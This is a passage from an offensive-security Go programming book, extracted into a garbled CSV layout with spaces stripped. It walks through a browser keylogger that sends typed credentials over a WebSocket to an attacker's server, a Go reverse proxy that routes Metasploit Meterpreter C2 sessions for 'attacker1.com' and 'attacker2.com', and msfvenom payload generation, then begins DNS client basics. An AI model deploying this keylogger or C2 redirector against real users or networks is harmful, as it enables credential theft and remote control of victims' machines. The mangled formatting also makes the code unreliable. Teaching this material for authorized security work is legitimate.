"Go,notJavaScript.(Checkout ",NA,NA
https://github.com/gopherjs/gopherjs/,NA,NA
forinstructionso,NA,NA
n writingJavaScriptwithGo.)TheJavaScriptcodeisshown,NA,NA
here:,"(function(){
  
  
 varconn=newWebSocket(""ws://{{.}}/ws"");
  
  
 document.onkeypress=keypress;
  
  
 functionkeypress(evt){
  
  
 s=String.fromCharCode(evt.which);
  
  
 conn.send(s);
  
  
 }
  
  
 })();",NA
TheJavaScriptcodehandleskeypressevents.Eachtimea ,NA,NA
"keyispressed,thecodesendsthekeystrokesovera ",NA,NA
WebSockettoaresourceat,ws://{{.}}/ws,NA
.Recallthatthe,{{.}},NA
valueisaGotemplateplaceholderrepresentingthecurrent ,NA,NA
context.ThisresourcerepresentsaWebSocketURLthatwill ,NA,NA
populatetheserverlocationinformationbasedonastring ,NA,NA
you’llpasstothetemplate.We’llgettothatinaminute.For ,NA,NA
"thisexample,you’llsavetheJavaScriptinafilenamed ",NA,NA
logger.js,NA,NA
.,NA,NA
"Butwait,yousay,wesaidwewereservingitas",NA,NA
k.js,NA,NA
!The ,NA,NA
HTMLweshowedpreviouslyalsoexplicitlyuses,NA,NA
k.js,NA,NA
.What ,NA,NA
"gives?Well,",NA,NA
logger.js,NA,NA
"isaGotemplate,notanactual ",NA,NA
JavaScriptfile.You’lluse,NA,NA
k.js,NA,NA
asyourpatterntomatchagainst ,NA,NA
"inyourrouter.Whenitmatches,yourserverwillrenderthe ",NA,NA
templatestoredinthe,NA,NA
logger.js,NA,NA
"file,completewithcontextual ",NA,NA
datathatrepresentsthehosttowhichyourWebSocket ,NA,NA
connects.Youcanseehowthisworksbylookingattheserver ,NA,NA
"code,shownin",NA,NA
Listing4-9,NA,NA
.,"import(
  
 ""flag"" 
  
 ""fmt"" 
  
 ""html/template"" 
  
 ""log""
  
 ""net/http""
  
  
 ""github.com/gorilla/mux""
  
 ❶""github.com/gorilla/websocke
 t"" 
  
 )
  
  
 var(
  
 ❷upgrader=websocket.Upgrader{ 
  
 CheckOrigin:func(r*http.Request)bool{returntrue},
  
  
 }",NA
"Wehavealottocoverhere.First,notethatyou’reusing ",NA,NA
"anotherthird-partypackage,",gorilla/websocket,NA
",tohandleyour ",NA,NA
"WebSocketcommunications❶.Thisisafull-featured, ",NA,NA
"powerfulpackagethatsimplifiesyourdevelopmentprocess, ",NA,NA
likethe,gorilla/mux,NA
routeryouusedearlierinthischapter.Don’t,NA,NA
forgettorun,gogetgithub.com/gorilla/websocket,NA
fromyourterminal,NA,NA
first.,NA,NA
Youthendefineseveralvariables.Youcreatea ,websocket.Upgrader,NA
instancethat’llessentiallywhitelistevery ,NA,NA
origin❷.It’stypicallybadsecuritypracticetoallowall ,NA,NA
"origins,butinthiscase,we’llrollwithitsincethisisatest ",NA,NA
instancewe’llrunonourlocalworkstations.Foruseinan ,NA,NA
"actualmaliciousdeployment,you’dlikelywanttolimitthe ",NA,NA
origintoanexplicitvalue.,NA,NA
Withinyour,init(),NA
"function,whichexecutesautomatically",NA,NA
before,main(),NA
",youdefineyourcommandlineargumentsand",NA,NA
attempttoparseyourGotemplatestoredinthe,NA,NA
logger.js,NA,NA
file.,NA,NA
Noticethatyou’recalling,"template.ParseFiles(""logger.js"")",NA
❸.You ,NA,NA
checktheresponsetomakesurethefileparsedcorrectly.Ifall ,NA,NA
"issuccessful,youhaveyourparsedtemplatestoredina ",NA,NA
variablenamed,jsTemplate,NA
.,NA,NA
"Atthispoint,youhaven’tprovidedanycontextualdatato ",NA,NA
"yourtemplateorexecutedit.That’llhappenshortly.First, ",NA,NA
"however,youdefineafunctionnamed",serveWS(),NA
thatyou’lluse,NA,NA
tohandleyourWebSocketcommunications.Youcreateanew ,websocket.Conn,NA
instancebycalling,"upgrader.Upgrade(http.ResponseWrite
 r, *http.Request,http.Header)",NA
❹.The,Upgrade(),NA
methodupgradesthe ,NA,NA
HTTPconnectiontousetheWebSocketprotocol.Thatmeans ,NA,NA
thatanyrequesthandledbythisfunctionwillbeupgradedto ,NA,NA
useWebSockets.Youinteractwiththeconnectionwithinan ,NA,NA
infinite,for,NA
"loop,calling",conn.ReadMessage(),NA
toreadincoming ,NA,NA
"messages❺.IfyourJavaScriptworksappropriately,these ",NA,NA
messagesshouldconsistofcapturedkeystrokes.Youwrite ,NA,NA
thesemessagesandtheclient’sremoteIPaddresstostdout❻.,NA,NA
You’vetackledarguablythehardestpieceofthepuzzlein ,NA,NA
"creatingyourWebSockethandler.Next,youcreateanother ",NA,NA
handlerfunctionnamed,serveFile(),NA
.Thisfunctionwillretrieve,NA,NA
"andreturnthecontentsofyourJavaScripttemplate,complete ",NA,NA
"withcontextualdataincluded.Todothis,yousetthe","Content-
 Type",NA
headeras,application/javascript,NA
❼.Thiswilltellconnecting ,NA,NA
browsersthatthecontentsoftheHTTPresponsebodyshould ,NA,NA
betreatedasJavaScript.Inthesecondandlastlineofthe ,NA,NA
"handlerfunction,youcall","jsTemplate.Execute(w,wsAddr)",NA
❽.,NA,NA
Rememberhowyouparsed,NA,NA
logger.js,NA,NA
whileyouwere ,NA,NA
bootstrappingyourserverinthe,init(),NA
function?Youstoredthe,NA,NA
resultwithinthevariablenamed,jsTemplate,NA
.Thislineofcode,NA,NA
processesthattemplate.Youpasstoitan,io.Writer,NA
"(inthiscase,",NA,NA
you’reusing,w,NA
",an",http.ResponseWriter,NA
)andyourcontextualdataof,NA,NA
type,interface{},NA
.The,interface{},NA
typemeansthatyoucanpassany,NA,NA
"typeofvariable,whetherthey’restrings,structs,orsomething ",NA,NA
"else.Inthiscase,you’repassingastringvariablenamed ",wsAddr,NA
.Ifyoujumpbackuptothe,init(),NA
"function,you’llseethat",NA,NA
thisvariablecontainstheaddressofyourWebSocketserver ,NA,NA
"andissetviaacommandlineargument.Inshort,itpopulates",NA,NA
thetemplatewithdataandwritesitasanHTTPresponse.,NA,NA
Prettyslick!,NA,NA
"You’veimplementedyourhandlerfunctions,",serveFile(),NA
and,serveWS(),NA
".Now,youjustneedtoconfigureyourrouterto",NA,NA
performpatternmatchingsothatyoucanpassexecutiontothe,NA,NA
"appropriatehandler.Youdothis,muchasyouhave",NA,NA
"previously,inyour",main(),NA
function.Thefirstofyourtwo,NA,NA
handlerfunctionsmatchesthe,/ws,NA
"URLpattern,executingyour",serveWS(),NA
functiontoupgradeandhandleWebSocket ,NA,NA
connections❾.Thesecondroutematchesthepattern,/k.js,NA
", ",NA,NA
executingthe,serveFile(),NA
functionasaresult❿.Thisishowyour ,NA,NA
serverpushesarenderedJavaScripttemplatetotheclient.,NA,NA
"Let’sfireuptheserver.IfyouopentheHTMLfile,you",NA,NA
shouldseeamessagethatreads,connectionestablished,NA
.Thisis,NA,NA
loggedbecauseyourJavaScriptfilehasbeenrenderedinthe,NA,NA
browserandrequestedaWebSocketconnection.Ifyouenter,NA,NA
"credentialsintotheformelements,youshouldseethem",NA,NA
printedtostdoutontheserver:,"$
 gorunmain.go-listen-addr=127.0.0.1:8080-ws-addr=127.0.0.1:8080
  
  
 Connectionfrom127.0.0.1:58438
  
  
 From127.0.0.1:58438:u
  
  
 From127.0.0.1:58438:s
  
  
 From127.0.0.1:58438:e
  
  
 From127.0.0.1:58438:r
  
  
 From127.0.0.1:58438:
  
  
 From127.0.0.1:58438:p
  
  
 From127.0.0.1:58438:@
  
  
 From127.0.0.1:58438:s
  
  
 From127.0.0.1:58438:s
  
  
 From127.0.0.1:58438:w
  
  
 From127.0.0.1:58438:o
  
  
 From127.0.0.1:58438:r",NA
Youdidit!Itworks!Youroutputlistseachindividual ,NA,NA
keystrokethatwaspressedwhenfillingouttheloginform.In ,NA,NA
"thiscase,it’sasetofusercredentials.Ifyou’rehavingissues, ",NA,NA
makesureyou’resupplyingaccurateaddressesascommand ,NA,NA
"linearguments.Also,theHTMLfileitselfmayneedtweaking ",NA,NA
ifyou’reattemptingtocall,NA,NA
k.js,NA,NA
fromaserverotherthan ,localhost:8080,NA
.,NA,NA
"Youcouldimprovethiscodeinseveralways.Forone,you ",NA,NA
mightwanttologtheoutputtoafileorotherpersistent ,NA,NA
"storage,ratherthantoyourterminal.Thiswouldmakeyou ",NA,NA
lesslikelytoloseyourdataiftheterminalwindowclosesor ,NA,NA
"theserverreboots.Also,ifyourkeyloggerlogsthekeystrokes ",NA,NA
"ofmultipleclientssimultaneously,theoutputwillmixthe ",NA,NA
"data,makingitpotentiallydifficulttopiecetogetheraspecific ",NA,NA
user’scredentials.Youcouldavoidthisbyfindingabetter ,NA,NA
"presentationformatthat,forexample,groupskeystrokesby ",NA,NA
uniqueclient/portsource.,NA,NA
Yourjourneythroughcredentialharvestingiscomplet,NA,NA
e. We’llendthischapterbypresentingmultiplexingHTTP ,NA,NA
command-and-controlconnections.,NA,NA
MULTIPLEXINGCOMMAND-AND-,NA,NA
CONTROL,NA,NA
You’vearrivedatthelastsectionofthechapteronHTTP ,NA,NA
"servers.Here,you’lllookathowtomultiplexMeterpreter ",NA,NA
HTTPconnectionstodifferentbackendcontrolservers.,NA,NA
Meterpreter,NA,NA
"isapopular,flexiblecommand-and-control(C2) ",NA,NA
suitewithintheMetasploitexploitationframework.Wewon’t,NA,NA
gointotoomanydetailsaboutMetasploitorMeterpreter.If ,NA,NA
"you’renewtoit,werecommendreadingthroughoneofthe ",NA,NA
manytutorialordocumentationsites.,NA,NA
"Inthissection,we’llwalkthroughcreatingareverseHTTP ",NA,NA
proxyinGosothatyoucandynamicallyrouteyourincoming ,NA,NA
Meterpretersessionsbasedonthe,Host,NA
"HTTPheader,whichis",NA,NA
"howvirtualwebsitehostingworks.However,insteadof ",NA,NA
"servingdifferentlocalfilesanddirectories,you’llproxythe ",NA,NA
connectiontodifferentMeterpreterlisteners.Thisisan ,NA,NA
interestingusecaseforafewreasons.,NA,NA
"First,yourproxyactsasaredirector,allowingyouto ",NA,NA
exposeonlythatdomainnameandIPaddresswithout ,NA,NA
exposingyourMetasploitlisteners.Iftheredirectorevergets ,NA,NA
"blacklisted,youcansimplymoveitwithouthavingtomove ",NA,NA
"yourC2server.Second,youcanextendtheconceptshereto ",NA,NA
perform,NA,NA
domainfronting,NA,NA
",atechniqueforleveragingtrusted ",NA,NA
third-partydomains(oftenfromcloudproviders)tobypass ,NA,NA
restrictiveegresscontrols.Wewon’tgointoafull-fledged ,NA,NA
"examplehere,butwehighlyrecommendyoudigintoit,asit ",NA,NA
"canbeprettypowerful,allowingyoutoegressrestricted ",NA,NA
"networks.Lastly,theusecasedemonstrateshowyoucanshare ",NA,NA
asinglehost/portcombinationamongateamofallies ,NA,NA
potentiallyattackingdifferenttargetorganizations.Sinceport,NA,NA
"s 80and443arethemostlikelyallowedegressports,youcan ",NA,NA
useyourproxytolistenonthoseportsandintelligentlyroute ,NA,NA
theconnectionstothecorrectlistener.,NA,NA
Here’stheplan.You’llsetuptwoseparateMeterpreter ,NA,NA
"reverseHTTPlisteners.Inthisexample,thesewillresideona ",NA,NA
"virtualmachinewithanIPaddressof10.0.1.20,buttheycould ",NA,NA
verywellexistonseparatehosts.You’llbindyourlistenersto,NA,NA
"ports10080and20080,respectively.Inarealsituation,these ",NA,NA
listenerscanberunninganywheresolongastheproxycan ,NA,NA
reachthoseports.MakesureyouhaveMetasploitinstalled(it ,NA,NA
comespre-installedonKaliLinux);thenstartyourlisteners.,"$
 msfconsole
  
  
 >
 useexploit/multi/handler
  
  
 >
 setpayloadwindows/meterpreter_reverse_htt
 p
 ❶>
 setLHOST10.0.1.20 
  
 >
 setLPORT80
  
 ❷>
 setReverseListenerBindAddress10.0.1.20 
 >
 setReverseListenerBindPort10080
  
  
 >
 exploit-j-z
  
  
 [*]Exploitrunningasbackgroundjob1.
  
  
 [*]StartedHTTPreversehandleronhttp://10.0.1.20:10080",NA
"Whenyoustartyourlistener,yousupplytheproxydataas ",NA,NA
the,LHOST,NA
and,LPORT,NA
"values❶.However,yousetthe ",NA,NA
advancedoptions,ReverseListenerBindAddress,NA
and,ReverseListenerBindPort,NA
totheactualIPandportonwhichyou ,NA,NA
wantthelistenertostart❷.Thisgivesyousomeflexibilityin ,NA,NA
portusagewhileallowingyoutoexplicitlyidentifytheproxy ,NA,NA
"host—whichmaybeahostname,forexample,ifyouwere ",NA,NA
settingupdomainfronting.,NA,NA
"OnasecondinstanceofMetasploit,you’lldosomething ",NA,NA
similartostartanadditionallisteneronport20080.Theonly ,NA,NA
realdifferencehereisthatyou’rebindingtoadifferentport:,"$
 msfconsole
  
  
 >
 useexploit/multi/handler
  
  
 >
 setpayloadwindows/meterpreter_reverse_http
  
  
 >
 setLHOST10.0.1.20
  
  
 >
 setLPORT80",NA
"Now,let’screateyourreverseproxy.",NA,NA
Listing4-10,NA,NA
shows ,NA,NA
thecodeinitsentirety.,"packagemain
  
 import( 
  
 ""log"" 
  
 ""net/http""
  
  
 ❶""net/http/httputil"" 
  
 ""net/url"" 
  
 ""github.com/gorilla/mux"" 
  
 )
  
 ❷var( 
  
 hostProxy=make(map[string]string) 
  
 proxies=make(map[string]*httputil.ReverseProxy) )
  
 funcinit(){
  
  
 ❸hostProxy[""attacker1.com""]=""http://10.0.1.20:100
 80"" 
 hostProxy[""attacker2.com""]=""http://10.0.1.20:20080""
  
  
 fork,v:=rangehostProxy{
  
  
 ❹remote,err:=url.Parse(v) 
  
 iferr!=nil{
  
 log.Fatal(""Unabletoparseproxytarget"") 
  
 }
  
  
 ❺proxies[k]=httputil.NewSingleHostReverseProxy(remote
 ) } 
  
 }
  
 funcmain(){ 
  
 r:=mux.NewRouter()
  
 forhost,proxy:=rangeproxies{",NA
"Firstoff,you’llnoticethatyou’reimportingthe ",net/http/httputil,NA
"package❶,whichcontainsfunctionalitytoassis",NA,NA
t withcreatingareverseproxy.It’llsaveyoufromhavingto ,NA,NA
createonefromscratch.,NA,NA
"Afteryouimportyourpackages,youdefineapairof ",NA,NA
"variables❷.Bothvariablesaremaps.You’llusethefirst, ",hostProxy,NA
",tomaphostnamestotheURLoftheMetasploit",NA,NA
listenertowhichyou’llwantthathostnametoroute. ,NA,NA
"Remember,you’llberoutingbasedonthe",Host,NA
headerthat,NA,NA
yourproxyreceivesintheHTTPrequest.Maintainingthis ,NA,NA
mappingisasimplewaytodeterminedestinations.,NA,NA
"Thesecondvariableyoudefine,",proxies,NA
",willalsouse",NA,NA
"hostnamesasitskeyvalues.However,theircorresponding ",NA,NA
valuesinthemapare,*httputil.ReverseProxy,NA
"instances.Thatis,the",NA,NA
"valueswillbeactualproxyinstancestowhichyoucanroute, ",NA,NA
ratherthanstringrepresentationsofthedestination.,NA,NA
"Noticethatyou’rehardcodingthisinformation,whichisn’t ",NA,NA
themostelegantwaytomanageyourconfigurationandproxy ,NA,NA
data.Abetterimplementationwouldstorethisinformationin ,NA,NA
anexternalconfigurationfileinstead.We’llleavethatasan ,NA,NA
exerciseforyou.,NA,NA
Youusean,init(),NA
functiontodefinethemappingsbetween ,NA,NA
domainnamesanddestinationMetasploitinstances❸.Inthis ,NA,NA
"case,you’llrouteanyrequestwitha",Host,NA
headervalueof,NA,NA
to,http://10.0.1.20:10080,NA
andanythingwitha,Host,NA
header,NA,NA
valueof,attacker2.com,NA
to,http://10.0.1.20:20080,NA
".Ofcourse,youaren’t",NA,NA
actuallydoingtheroutingyet;you’rejustcreatingyour ,NA,NA
rudimentaryconfiguration.Noticethatthedestination,NA,NA
s correspondtothe,ReverseListenerBindAddress,NA
and,ReverseListenerBindPort,NA
valuesyouusedforyourMeterpreter,NA,NA
listenersearlier.,NA,NA
"Next,stillwithinyour",init(),NA
"function,youloopoveryour",hostProxy,NA
"map,parsingthedestinationaddressestocreate",net.URL,NA
instances❹.Youusetheresultofthisasinputintoacallto ,httputil.NewSingleHostReverseProxy(net.URL),NA
"❺,whichisahelper ",NA,NA
"functionthatcreatesareverseproxyfromaURL.Evenbetter, ",NA,NA
the,httputil.ReverseProxy,NA
typesatisfiesthe,http.Handler,NA
"interface,",NA,NA
whichmeansyoucanusethecreatedproxyinstancesas ,NA,NA
handlersforyourrouter.Youdothiswithinyour,main(),NA
function.Youcreatearouterandthenloopoverallofyour ,NA,NA
"proxyinstances.Recallthatthekeyisthehostname,andthe ",NA,NA
valueisoftype,httputil.ReverseProxy,NA
.Foreachkey/valuepairin ,NA,NA
"yourmap,youaddamatchingfunctionontoyourrouter❻. ",NA,NA
TheGorillaMUXtoolkit’s,Route,NA
typecontainsamatching,NA,NA
functionnamed,Host,NA
thatacceptsahostnametomatch,Host,NA
headervaluesinincomingrequestsagainst.Foreachhostnam,NA,NA
"e youwanttoinspect,youtelltheroutertousethe ",NA,NA
correspondingproxy.It’sasurprisinglyeasysolutiontowhat ,NA,NA
couldotherwisebeacomplicatedproblem.,NA,NA
"Yourprogramfinishesbystartingtheserver,bindingitto ",NA,NA
port80.Saveandruntheprogram.You’llneedtodosoasa ,NA,NA
privilegedusersinceyou’rebindingtoaprivilegedport.,NA,NA
"Atthispoint,youhavetwoMeterpreterreverseHTTP",NA,NA
"listenersrunning,andyoushouldhaveareverseproxyrunning ",NA,NA
nowaswell.Thelaststepistogeneratetestpayloadstocheck ,NA,NA
thatyourproxyworks.Let’suse,msfvenom,NA
",apayloadgeneration",NA,NA
"toolthatshipswithMetasploit,togenerateapairofWindows ",NA,NA
executablefiles:,"$
 msfvenom-pwindows/meterpreter_reverse_httpLHOST=10.0.1.20
  
  
 LPORT=80
  
  
 HttpHostHeader=attacker1.com-fexe-opayload1.exe
  
  
 $
 msfvenom-pwindows/meterpreter_reverse_httpLHOST=10.0.1.20
  
  
 LPORT=80
  
  
 HttpHostHeader=attacker2.com-fexe-opayload2.exe",NA
Thisgeneratestwooutputfilesnamed,NA,NA
payload1.exe,NA,NA
and ,NA,NA
payload2.exe,NA,NA
".Noticethattheonlydifferencebetweenthetwo, ",NA,NA
"besidestheoutputfilename,isthe",HttpHostHeader,NA
values.This,NA,NA
ensuresthattheresultingpayloadsendsitsHTTPrequests ,NA,NA
withaspecific,Host,NA
headervalue.Alsoofnoteisthatthe,LHOST,NA
and,LPORT,NA
valuescorrespondtoyourreverseproxy,NA,NA
informationandnotyourMeterpreterlisteners.Transferthe ,NA,NA
resultingexecutablestoaWindowssystemorvirtualmachine. ,NA,NA
"Whenyouexecutethefiles,youshouldseetwonewsessions ",NA,NA
"established:oneonthelistenerboundtoport10080,andone ",NA,NA
onthelistenerboundtoport20080.Theyshouldlook ,NA,NA
somethinglikethis:,">
  
 [*]http://10.0.1.20:10080handlingrequestfrom10.0.1.20;(UUID:hff7podk) 
 Redirectingstageless 
  
 connectionfrom/pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-
  
 3UdLhACr8-Qt6QOlOw 
  
 PTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEBwithUA 
 'Mozilla/5.0(WindowsNT6.1; 
  
 Trident/7.0;
  
 rv:11.0)likeGecko'",NA
IfyouusetcpdumporWiresharktoinspectnetworktraffic ,NA,NA
"destinedforport10080or20080,youshouldseethatyour ",NA,NA
reverseproxyistheonlyhostcommunicatingwiththe ,NA,NA
Metasploitlistener.Youcanalsoconfirmthatthe,Host,NA
header,NA,NA
issetappropriatelyto,attacker1.com,NA
(forthelisteneronport,NA,NA
10080)and,attacker2.com,NA
(forthelisteneronport20080).,NA,NA
"That’sit.You’vedoneit!Now,takeitupanotch.Asan ",NA,NA
"exerciseforyou,werecommendyouupdatethecodetousea ",NA,NA
"stagedpayload.Thislikelycomeswithadditionalchallenges, ",NA,NA
asyou’llneedtoensurethatbothstagesareproperlyrouted ,NA,NA
"throughtheproxy.Further,trytoimplementitbyusing ",NA,NA
HTTPSinsteadofcleartextHTTP.Thiswillfurtheryour ,NA,NA
"understandingandeffectivenessatproxyingtrafficinuseful, ",NA,NA
nefariousways.,NA,NA
SUMMARY,NA,NA
"You’vecompletedyourjourneyofHTTP,workingthrough ",NA,NA
bothclientandserverimplementationsoverthelasttwo ,NA,NA
"chapters.Inthenextchapter,you’llfocusonDNS,anequally ",NA,NA
"usefulprotocolforsecuritypractitioners.Infact,you’llcome ",NA,NA
closetoreplicatingthisHTTPmultiplexingexampleusing ,NA,NA
DNS.,NA,NA
5 ,NA,NA
EXPLOITINGDNS,NA,NA
The,NA,NA
DomainNameSystem(DNS),NA,NA
locatesinternetdomain ,NA,NA
namesandtranslatesthemtoIPaddresses.Itcanbean ,NA,NA
"effectiveweaponinthehandsofanattacker,because ",NA,NA
organizationscommonlyallowtheprotocoltoegressrestricte,NA,NA
d networksandtheyfrequentlyfailtomonitoritsuse ,NA,NA
"adequately.Ittakesalittleknowledge,butsavvyattackerscan ",NA,NA
leveragetheseissuesthroughoutnearlyeverystepofanattack ,NA,NA
"chain,includingreconnaissance,commandandcontrol(C2), ",NA,NA
"andevendataexfiltration.Inthischapter,you’lllearnhowto ",NA,NA
writeyourownutilitiesbyusingGoandthird-partypackages ,NA,NA
toperformsomeofthesecapabilities.,NA,NA
You’llstartbyresolvinghostnamesandIPaddressesto ,NA,NA
revealthemanytypesofDNSrecordsthatcanbeenumerated. ,NA,NA
Thenyou’llusepatternsillustratedinearlierchapterstobuild ,NA,NA
"amassivelyconcurrentsubdomain-guessingtool.Finally, ",NA,NA
"you’lllearnhowtowriteyourownDNSserverandproxy,and ",NA,NA
you’lluseDNStunnelingtoestablishaC2channeloutofa ,NA,NA
restrictivenetwork!,NA,NA
WRITINGDNSCLIENTS,NA,NA
"Beforeexploringprogramsthataremorecomplex,let’sget ",NA,NA
acquaintedwithsomeoftheoptionsavailableforclient ,NA,NA
operations.Go’sbuilt-in,net,NA
packageoffersgreatfunctionality,NA,NA
"andsupportsmost,ifnotall,recordtypes.Theupsidetothe ",NA,NA
"built-inpackageisitsstraightforwardAPI.Forexample, ",LookupAddr(addrstring),NA
returnsalistofhostnamesforagivenIP,NA,NA
address.ThedownsideofusingGo’sbuilt-inpackageisthat ,NA,NA
"youcan’tspecifythedestinationserver;instead,thepackage ",NA,NA
willusetheresolverconfiguredonyouroperatingsystem. ,NA,NA
Anotherdownsideisthatyoucan’trundeepinspectionofthe ,NA,NA
results.,NA,NA
"Togetaroundthis,you’lluseanamazingthird-party ",NA,NA
packagecalledthe,NA,NA
GoDNSpackage,NA,NA
writtenbyMiekGieben.,NA,NA
ThisisourpreferredDNSpackagebecauseit’shighly ,NA,NA
"modular,wellwritten,andwelltested.Usethefollowingto ",NA,NA
installthispackage:,"$
 gogetgithub.com/miekg/dns",NA
"Oncethepackageisinstalled,you’rereadytofollowalong ",NA,NA
withtheupcomingcodeexamples.You’llbeginbyperforming ,NA,NA
ArecordlookupsinordertoresolveIPaddressesfor ,NA,NA
hostnames.,NA,NA
RetrievingARecords,NA,NA
Let’sstartbyperformingalookupfora,NA,NA
fullyqualifieddomain ,NA,NA
name(FQDN),NA,NA
",whichspecifiesahost’sexactlocationinthe ",NA,NA
DNShierarchy.Thenwe’llattempttoresolvethatFQDNtoan ,NA,NA
"IPaddress,usingatypeofDNSrecordcalledan",NA,NA
Arecord,NA,NA
.We,NA,NA
useArecordstopointadomainnametoanIPaddress.,NA,NA
Listing 5-,NA,NA
1,NA,NA
showsanexamplelookup.(Allthecodelistingsattheroot ,NA,NA
locationof/existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.),"packagemain
  
  
 import(
  
  
 ""fmt""
  
  
 ""github.com/miekg/dns""
  
  
 )
  
  
 funcmain(){
  
 ❶varmsgdns.Msg
  
 ❷fqdn:=dns.Fqdn(""stacktitan.com"")
  
 ❸msg.SetQuestion(fqdn,dns.TypeA)
  
 ❹dns.Exchange(&msg,""8.8.8.8:53"")
  
 }
  
 Listing5-1:RetrievinganArecord(
 /ch-5/get_a/main.go
 )",NA
Startbycreatinganew,Msg,NA
❶andthencall,"fqdn(
 string
 )",NA
to ,NA,NA
transformthedomainintoaFQDNthatcanbeexchangedwith ,NA,NA
"aDNSserver❷.Next,modifytheinternalstateofthe",Msg,NA
withacallto,"SetQuestion(
 string
 ,uint16)",NA
byusingthe,TypeA,NA
valueto ,NA,NA
denoteyourintenttolookupanArecord❸.(Thisisa,const,NA
definedinthepackage.Youcanviewtheothersupported ,NA,NA
"valuesinthepackagedocumentation.)Finally,placeacallto ","Exchange(*Msg,
 string
 )",NA
❹inordertosendthemessagetothe ,NA,NA
"providedserveraddress,whichisaDNSserveroperatedby ",NA,NA
Googleinthiscase.,NA,NA
"Asyoucanprobablytell,thiscodeisn’tveryuseful.",NA,NA
Althoughyou’resendingaquerytoaDNSserverandasking ,NA,NA
"fortheArecord,youaren’tprocessingtheanswer;youaren’t",NA,NA
doinganythingmeaningfulwiththeresult.Priorto ,NA,NA
"programmaticallydoingthatinGo,let’sfirstreviewwhatthe ",NA,NA
DNSanswerlookslikesothatwecangainadeeper ,NA,NA
understandingoftheprotocolandthedifferentquerytypes.,NA,NA
Beforeyouexecutetheprogramin,NA,NA
Listing5-1,NA,NA
",runa ",NA,NA
"packetanalyzer,suchasWiresharkortcpdump,toviewthe ",NA,NA
traffic.Here’sanexampleofhowyoumightusetcpdumpona ,NA,NA
Linuxhost:,"$
 sudotcpdump-ieth0-nudpport53",NA
"Inaseparateterminalwindow,compileandexecuteyour ",NA,NA
programlikethis:,"$
 gorunmain.go",NA
"Onceyouexecuteyourcode,youshouldseeaconnection ",NA,NA
to8.8.8.8overUDP53intheoutputfromyourpacketcapture. ,NA,NA
"YoushouldalsoseedetailsabouttheDNSprotocol,asshown ",NA,NA
here:,"$
 sudotcpdump-ieth0-nudpport53
  
  
 tcpdump:verboseoutputsuppressed,use-vor-vvforfullprotocoldecode
  
  
 listeningonens33,link-typeEN10MB(Ethernet),capturesize262144bytes 
 23:55:16.523741IP192.168.7.51.53307>8.8.8.8.53:❶25147+A?❷stack
 titan.com.(32)
  
  
 23:55:16.650905IP8.8.8.8.53>192.168.7.51.53307:251471/0/0A 
 104.131.56.170(48)❸",NA
Thepacketcaptureoutputproducesacoupleoflinesthat ,NA,NA
"requirefurtherexplanation.First,aqueryisbeingplacedfrom ",NA,NA
192.168.7.51to8.8.8.8byusingUDP53❶whilerequesting ,NA,NA
aDNSArecord❷.Theresponse❸isreturnedfrom ,NA,NA
"Google’s8.8.8.8DNSserver,whichcontainstheresolvedIP",NA,NA
"address,104.131.56.170.",NA,NA
"Usingapacketanalyzersuchastcpdump,you’reableto ",NA,NA
resolvethedomainname,stacktitan.com,NA
toanIPaddress.Now ,NA,NA
let’stakealookathowtoextractthatinformationbyusing ,NA,NA
Go.,NA,NA
ProcessingAnswersfromaMsgstruct,NA,NA
Thereturnedvaluesfrom,"Exchange(*Msg,
 string
 )",NA
are,"(*Msg,
 error
 )",NA
. ,NA,NA
Returningthe,error,NA
typemakessenseandiscommoninGo ,NA,NA
"idioms,butwhydoesitreturn",*Msg,NA
ifthat’swhatyoupassed ,NA,NA
"in?Toclarifythis,lookathowthe",struct,NA
isdefinedinthe ,NA,NA
source:,"typeMsgstruct{
  
  
 MsgHdr
  
  
 Compressbool`json:""-
 ""`//Iftrue,themessagewillbecompressed...❶Question[]Question//Holdst
 heRR(s)ofthequestionsection.❷Answer[]RR//HoldstheRR(s)oftheansw
 ersection.
  
 Ns[]RR//HoldstheRR(s)oftheauthoritysection.
  
  
 Extra[]RR//HoldstheRR(s)oftheadditionalsection.
  
  
 }",NA
"Asyoucansee,the",Msgstruct,NA
holdsbothquestionsand ,NA,NA
answers.ThisletsyouconsolidateallyourDNSquestionsand ,NA,NA
"theiranswersintoasingle,unifiedstructure.The",Msg,NA
typehas ,NA,NA
variousmethodsthatmakeworkingwiththedataeasier.For ,NA,NA
"example,the",Question,NA
slice❶isbeingmodifiedwiththe ,NA,NA
conveniencemethod,SetQuestion(),NA
.Youcouldmodifythisslice ,NA,NA
directlybyusing,append(),NA
andachievethesameoutcome.The ,Answer,NA
slice❷holdstheresponsetothequeriesandisoftype ,RR,NA
.,NA,NA
Listing5-2,NA,NA
demonstrateshowtoprocesstheanswers.,NA,NA
Ourexamplebeginsbystoringthevaluesreturnedfrom,Exchange,NA
",checkingwhethertherewasanerror,andifso,calling ",panic(),NA
tostoptheprogram❶.The,panic(),NA
functionletsyou ,NA,NA
quicklyseethestacktraceandidentifywheretheerror,NA,NA
"occurred.Next,validatethatthelengthofthe",Answer,NA
sliceisat ,NA,NA
"least1❷,andifitisn’t,indicatethattherearenorecordsand ",NA,NA
"immediatelyreturn—afterall,therewillbelegitimate",NA,NA
instanceswhenthedomainnamecannotberesolved.,NA,NA
Thetype,RR,NA
"isaninterfacewithonlytwodefinedmethods,",NA,NA
andneitherallowsaccesstotheIPaddressstoredinthe ,NA,NA
"answer.ToaccessthoseIPaddresses,you’llneedtoperforma ",NA,NA
typeassertiontocreateaninstanceofthedataasyourdesired ,NA,NA
type.,NA,NA
"First,loopoveralltheanswers.Next,performthetype ",NA,NA
assertionontheanswertoensurethatyou’redealingwitha ,*dns.A,NA
"type❸.Whenperformingthisaction,youcanreceive ",NA,NA
twovalues:thedataastheassertedtypeanda,bool,NA
representing ,NA,NA
whethertheassertionwassuccessful❹.Afterchecking ,NA,NA
"whethertheassertionwassuccessful,printtheIPaddress ",NA,NA
storedin,a.A,NA
❺.Althoughthetypeis,net.IP,NA
",itdoesimplementa ",String(),NA
"method,soyoucaneasilyprintit.",NA,NA
"Spendtimewiththiscode,modifyingtheDNSqueryand ",NA,NA
exchangetosearchforadditionalrecords.Thetypeassertion ,NA,NA
"maybeunfamiliar,butit’sasimilarconcepttotypecastingin ",NA,NA
otherlanguages.,NA,NA
EnumeratingSubdomains,NA,NA
"NowthatyouknowhowtouseGoasaDNSclient,youcan ",NA,NA
